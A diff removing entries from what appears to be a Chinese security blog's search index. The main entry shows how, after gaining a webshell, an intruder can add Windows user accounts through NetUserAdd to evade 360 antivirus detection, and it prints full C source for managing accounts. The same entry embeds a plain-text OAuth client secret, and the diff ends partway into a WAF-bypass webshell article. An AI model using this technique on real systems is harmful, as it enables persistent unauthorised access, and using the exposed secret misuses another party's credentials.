@@ -1,715 +1,129 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[即刻安全纯技术交流群]]></title>
-      <url>/jishu.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br><a id="more"></a></p>
-<p> &nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。<br> &nbsp;<br> 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。<br> 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889<br> 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围</p>
-<pre><code>特此：即刻安全团体敬上
-                Demon  2017.8.27
-</code></pre><p>&nbsp;<br>&nbsp;</p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/BA873B7BBDED07564E11CA6736849726.png" alt="enter description here"></p>
-]]></content>
-      
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[绕过安全防护敏感检测行为]]></title>
-      <url>/Bypass3.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/access-dark-web-while-staying-anonymous-with-tor.1280x600-1.jpg" alt="enter description here"><br><a id="more"></a></p>
-<p><font color="#FF0000"> 投稿原作者：onion</font></p>
-<h2 id="1-思考"><a href="#1-思考" class="headerlink" title="1.思考"></a>1.思考</h2><p>昨天，通过静态免杀可以bypass国内杀软，当我们想执行一些敏感的操作时，……</p>
-<p>有很多时候，在渗透测试中，拿到了Webshell，查看了权限，发现是系统权限，很开心，但是往往防护软件会给你当头一棒，呵呵，添加用户的时候，却被360拦截…</p>
-<p>那么如何解决呢？在这篇文章中，提供了一些思路<a href="http://www.91ri.org/13805.html" target="_blank" rel="external">http://www.91ri.org/13805.html</a> </p>
-<h2 id="2-我有一个大胆的想法"><a href="#2-我有一个大胆的想法" class="headerlink" title="2.我有一个大胆的想法"></a>2.我有一个大胆的想法</h2><p>所以我就假设了一个想法：<br>360安全卫士是一个应用程序，它是如何检测用户是是否添加用户的呢？答案当然是命令行了。<br>假设它获取每一行命令去分析，然后判断是否拦截，那么肯定是使用的系统API吧？要不然程序员会头炸的。<br>大概这样简单的设想，我们就开始验证了。<br>在Windows编程中间，我们经常需要添加用户，删除用户，添加用户组等等功能，那些功能如何实现呢？搜索了一下windows提供的API，文末提高全功能源码。<br><a href="https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#</a><br>本文需要的技术背景（visual c++编程基础，dos命令）<br>环境，vm10 360安全卫士最新版，防护全部开启。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/59B7856A-1ED8-47E3-B71D-E18DBD3F6289.png" alt="enter description here"><br>&nbsp;<br>然后再用API添加。</p>
-<p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/5DCD9BD9-73C7-4BE5-A72D-44A27389865A.png" alt="enter description here"><br>&nbsp;<br>直接创建呢？发现失败了，基于行为检测。<br>最后可以发现最新版本的360安全卫士已经pass<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/785D5130-ED0C-4AD2-9E93-5AB4BC153F68.png" alt="enter description here"><br>&nbsp;</p>
-<h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><p>现在我们分析，假设服务器上net.exe被删除了怎么办？</p>
-<p>#pragma comment(lib, “netapi32.lib”) 这行代码主要是导入了一个dll，名称为netapi32.dll 如果服务器上没有net.exe，我们将此dll和这个命令行工具上传至服务器，也是可以添加用户的，这就是以前的无net添加用户。</p>
-<h2 id="4-Code"><a href="#4-Code" class="headerlink" title="4.Code"></a>4.Code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">```javascript</div><div class="line"></div><div class="line"></div><div class="line">//编译平台：VC++6.0 Win10专业版</div><div class="line">#ifndef UNICODE</div><div class="line">#define UNICODE</div><div class="line">#endif</div><div class="line"></div><div class="line">#include&lt;windows.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;assert.h&gt;</div><div class="line">#include&lt;lm.h&gt;</div><div class="line">#pragma comment(lib, &quot;netapi32.lib&quot;)</div><div class="line"></div><div class="line">int wmain(int argc, wchar_t *argv[])</div><div class="line">&#123;</div><div class="line">    USER_INFO_1 ui;</div><div class="line">    DWORD dwLevel = 1;</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    if (argc != 3)</div><div class="line">    &#123;</div><div class="line">        printf(&quot;==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;);</div><div class="line">        fwprintf(stderr, L&quot;\tUsage: %s UserName PassWord&quot;, argv[0]);</div><div class="line">        printf(&quot;\n==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line">    ui.usri1_name = argv[1];</div><div class="line">    ui.usri1_password = argv[2];</div><div class="line">    ui.usri1_priv = USER_PRIV_USER;</div><div class="line">    ui.usri1_home_dir = NULL;</div><div class="line">    ui.usri1_comment = NULL;</div><div class="line">    ui.usri1_flags = UF_SCRIPT;</div><div class="line">    ui.usri1_script_path = NULL;</div><div class="line">    nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError);</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;\n[*]User add success!! UserName is [%s] \n&quot;, argv[1]);</div><div class="line">    else</div><div class="line">        printf(&quot;Can not add user ... System Error Code is %d \nPlase go to https://msdn.microsoft.com/en-us/library/ms681381(v=vs.85).aspx &quot;, nStatus);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* UNICODE */</div><div class="line">#ifndef UNICODE</div><div class="line">#define UNICODE</div><div class="line">#endif</div><div class="line">/* 头文件 */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;assert.h&gt;</div><div class="line">#include &lt;windows.h&gt; </div><div class="line">#include &lt;lm.h&gt;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* AddUser</div><div class="line">* 功能    增加用户</div><div class="line">* 参数    szServerName，主机名，如果为本机增加用户，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">*           szPassword，密码</div><div class="line">**************************************/</div><div class="line">int AddUser(LPWSTR szServerName, </div><div class="line">            LPWSTR szUserName,</div><div class="line">            LPWSTR szPassword)</div><div class="line">&#123;</div><div class="line">    USER_INFO_1 ui;</div><div class="line">    DWORD dwLevel = 1;  // 使用 USER_INFO_1 作为参数</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    // 填充 USER_INFO_1</div><div class="line">    ui.usri1_name = szUserName; // 用户名</div><div class="line">    ui.usri1_password = szPassword; // 密码</div><div class="line">    ui.usri1_priv = USER_PRIV_USER; // privilege  </div><div class="line">    ui.usri1_home_dir = NULL;</div><div class="line">    ui.usri1_comment = NULL;</div><div class="line">    ui.usri1_flags = UF_SCRIPT;</div><div class="line">    ui.usri1_script_path = NULL;</div><div class="line">    // 调用 NetUserAdd 增加用户</div><div class="line">    nStatus = NetUserAdd(szServerName,</div><div class="line">        dwLevel,</div><div class="line">        (LPBYTE)&amp;ui,</div><div class="line">        &amp;dwError);</div><div class="line"></div><div class="line">    // 判断结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">    &#123;</div><div class="line">        wprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* AddUserToGroup</div><div class="line">* 功能    为用户组增加用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">*           szGroup，用户组名</div><div class="line">**************************************/</div><div class="line">int AddUserToGroup(LPWSTR szServerName, </div><div class="line">                   LPWSTR szUserName,  </div><div class="line">                   LPWSTR szGroup)</div><div class="line">&#123;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    // 调用 NetGroupAddUser</div><div class="line">    nStatus =  NetGroupAddUser(</div><div class="line">        szServerName,</div><div class="line">        szGroup,</div><div class="line">        szUserName</div><div class="line">        );</div><div class="line"></div><div class="line">    // 判断结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line"></div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;NetGroupAddUser A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* DelUser</div><div class="line">* 功能    删除用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">**************************************/</div><div class="line">int DelUser(LPWSTR szServerName, LPWSTR szUserName)</div><div class="line">&#123;</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    // 调用 NetUserDel 删除用户</div><div class="line">    nStatus = NetUserDel(szServerName, szUserName);</div><div class="line">    // 判断并显示结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;User %s has been successfully deleted on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line"></div><div class="line">    return 0;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* int ListUsers(LPWSTR pszServerName)</div><div class="line">* 功能    列举用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">**************************************/</div><div class="line">int ListUsers(LPWSTR pszServerName)</div><div class="line">&#123;</div><div class="line">    LPUSER_INFO_0 pBuf = NULL;</div><div class="line">    LPUSER_INFO_0 pTmpBuf;</div><div class="line">    DWORD dwLevel = 0;</div><div class="line">    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;</div><div class="line">    DWORD dwEntriesRead = 0;</div><div class="line">    DWORD dwTotalEntries = 0;</div><div class="line">    DWORD dwResumeHandle = 0;</div><div class="line">    DWORD i;</div><div class="line">    DWORD dwTotalCount = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    // 循环，直到可以成功调用 NetUserEnum</div><div class="line">    do </div><div class="line">    &#123;</div><div class="line">        // 调用NetUserEnum函数</div><div class="line">        nStatus = NetUserEnum(pszServerName,</div><div class="line">            dwLevel,// 这里设置为0，使用 LPUSER_INFO_0 返回结果</div><div class="line">            FILTER_NORMAL_ACCOUNT, // 只列举“正常”类型的用户</div><div class="line">            (LPBYTE*)&amp;pBuf,// LPUSER_INFO_0 保存返回结果</div><div class="line">            // MAX_PREFERRED_LENGTH，内存由API分配，需要在之后调用NetApiBufferFree释放</div><div class="line">            dwPrefMaxLen,</div><div class="line">            &amp;dwEntriesRead,// 读了的 Entries</div><div class="line">            &amp;dwTotalEntries,// 一共的 Entries</div><div class="line">            &amp;dwResumeHandle);</div><div class="line">        // 判断是否成功</div><div class="line">        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))</div><div class="line">        &#123;</div><div class="line">            if ((pTmpBuf = pBuf) != NULL)</div><div class="line">            &#123;</div><div class="line">                // 循环读取用户信息</div><div class="line">                for (i = 0; (i &lt; dwEntriesRead); i++)</div><div class="line">                &#123;</div><div class="line">                    assert(pTmpBuf != NULL);</div><div class="line"></div><div class="line">                    if (pTmpBuf == NULL)</div><div class="line">                    &#123;</div><div class="line">                        fprintf(stderr, &quot;An access violation has occurred\n&quot;);</div><div class="line">                        break;</div><div class="line">                    &#125;</div><div class="line">                    // 输出</div><div class="line">                    wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;usri0_name);</div><div class="line">                    // 下一个</div><div class="line">                    pTmpBuf++;</div><div class="line">                    dwTotalCount++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">            fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">        // 释放内存</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            NetApiBufferFree(pBuf);</div><div class="line">            pBuf = NULL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    while (nStatus == ERROR_MORE_DATA); // end do</div><div class="line"></div><div class="line">    // 释放内存</div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line"></div><div class="line">    fprintf(stderr, &quot;Total of %d users\n\n&quot;, dwTotalCount);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* int ListGroup(LPWSTR pszServerName)</div><div class="line">* 功能    列举用户组</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">**************************************/</div><div class="line">int ListGroup(LPWSTR pszServerName)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    DWORD dwLevel = 0;</div><div class="line">    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;</div><div class="line">    DWORD dwEntriesRead = 0;</div><div class="line">    DWORD dwTotalEntries = 0;</div><div class="line">    DWORD dwResumeHandle = 0;</div><div class="line">    DWORD i;</div><div class="line">    DWORD dwTotalCount = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line"></div><div class="line">    LPLOCALGROUP_INFO_0 pBuf = NULL;</div><div class="line">    LPLOCALGROUP_INFO_0 pTmpBuf;</div><div class="line"></div><div class="line">    do // begin do</div><div class="line">    &#123;</div><div class="line">        // 调用NetLocalGroupEnum 参数设置与NetLocalGroup类似</div><div class="line">        nStatus = NetLocalGroupEnum(</div><div class="line">            pszServerName,</div><div class="line">            0,</div><div class="line">            (LPBYTE*)&amp;pBuf,</div><div class="line">            dwPrefMaxLen,</div><div class="line">            &amp;dwEntriesRead,</div><div class="line">            &amp;dwTotalEntries,</div><div class="line">            &amp;dwResumeHandle);</div><div class="line">        // 判断结果</div><div class="line">        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))</div><div class="line">        &#123;</div><div class="line">            if ((pTmpBuf = pBuf) != NULL)</div><div class="line">            &#123;</div><div class="line">                // 循环输出</div><div class="line">                for (i = 0; (i &lt; dwEntriesRead); i++)</div><div class="line">                &#123;</div><div class="line">                    assert(pTmpBuf != NULL);</div><div class="line"></div><div class="line">                    if (pTmpBuf == NULL)</div><div class="line">                    &#123;</div><div class="line">                        fprintf(stderr, &quot;An access violation has occurred\n&quot;);</div><div class="line">                        break;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;lgrpi0_name);</div><div class="line">                    pTmpBuf++;</div><div class="line">                    dwTotalCount++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        else</div><div class="line">            fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">        // 释放内存</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            NetApiBufferFree(pBuf);</div><div class="line">            pBuf = NULL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    while (nStatus == ERROR_MORE_DATA); // end do</div><div class="line"></div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line"></div><div class="line">    fprintf(stderr, &quot;Total of %d groups\n\n&quot;, dwTotalCount);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* ShowUsersInfo</div><div class="line">* 功能    显示指定用户的信息</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           pszUserName，用户名</div><div class="line">**************************************/</div><div class="line">int ShowUsersInfo(LPWSTR pszServerName,LPWSTR pszUserName)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    DWORD dwLevel = 4;// 使用 LPUSER_INFO_4 返回结果</div><div class="line">    LPUSER_INFO_4 pBuf = NULL;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    nStatus = NetUserGetInfo(pszServerName,</div><div class="line">        pszUserName,</div><div class="line">        dwLevel,    // pBuf参数类型</div><div class="line">        (LPBYTE *)&amp;pBuf);</div><div class="line">    </div><div class="line">    // 判断并输出结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">    &#123;</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            wprintf(L&quot;\n\tAccount:      %s\n&quot;, pBuf-&gt;usri4_name);</div><div class="line">            wprintf(L&quot;\tComment:      %s\n&quot;, pBuf-&gt;usri4_comment);</div><div class="line">            wprintf(L&quot;\tUser comment: %s\n&quot;, pBuf-&gt;usri4_usr_comment);</div><div class="line">            wprintf(L&quot;\tFull name:    %s\n&quot;, pBuf-&gt;usri4_full_name);</div><div class="line">            wprintf(L&quot;\tpriv:    %d\n&quot;, pBuf-&gt;usri4_priv);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    // 释放内存</div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line">    return 0;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* wmain</div><div class="line">* 功能    入口函数，根据参数判断需要调用的功能函数</div><div class="line">* 参数    参见usage输出</div><div class="line">**************************************/</div><div class="line">int __cdecl wmain(int ac, wchar_t * av[])</div><div class="line">&#123;</div><div class="line"></div><div class="line">    if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-a&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        AddUser(NULL, av[2], av[3]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    else if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-g&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        AddUserToGroup(NULL, av[2], av[3]);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        ShowUsersInfo(NULL, av[2]);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 2 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        ListUsers(NULL);</div><div class="line">        ListGroup(NULL);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-d&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        DelUser(NULL, av[2]);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        printf(&quot;usage: \n&quot;</div><div class="line">            &quot;\t %ws -a &lt;username&gt; &lt;password&gt; to add a user\n&quot;</div><div class="line">            &quot;\t %ws -g &lt;username&gt; &lt;group&gt; add a user to a group&quot;</div><div class="line">            &quot;\t %ws -i &lt;username&gt; to show user info\n&quot;</div><div class="line">            &quot;\t %ws -d &lt;username&gt; to del a user\n&quot;, </div><div class="line">            av[0], av[0], av[0], av[0]);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="5-欢迎下方一起参与讨论"><a href="#5-欢迎下方一起参与讨论" class="headerlink" title="5.欢迎下方一起参与讨论"></a>5.欢迎下方一起参与讨论</h2><p>&nbsp;</p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> bypass </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> bypass,渗透,web </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Bypass_safedog系列1]]></title>
-      <url>/bypass_shell.html</url>
-      <content type="html"><![CDATA[<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br><a id="more"></a></p>
-<blockquote>
-<p>环境:php+mysql+apche<br><br>安全狗:apache版本+8.10规则库<br><br><a href="http://www.inksec.cn/" target="_blank" rel="external">即刻安全</a><br><br>即刻安全纯技术交流群：307283889<br><br>如需转载，请联系本博主声明，私自转载必追究</p>
-</blockquote>
-<h1 id="Prat-1"><a href="#Prat-1" class="headerlink" title="Prat 1"></a>Prat 1</h1><p>在bypass小分队中V@1n3R表哥提到他明天会分享过waf的一句话<br><br>爱搞事的我当然不能只做伸手党,于是决定也分享一些出来,可是发现许久没有做渗透测试了<br><br>手里并没有过waf的一句话了，没办法只好临时刚几个出来</p>
-<h2 id="思路构思以及实现"><a href="#思路构思以及实现" class="headerlink" title="思路构思以及实现"></a>思路构思以及实现</h2><p>本次bypass需要用的一个函数：</p>
-<blockquote>
-<p><a href="http://www.w3school.com.cn/php/func_string_substr.asp" target="_blank" rel="external">substr()</a> //用于返回字符串的一部分。<br><br></p>
-</blockquote>
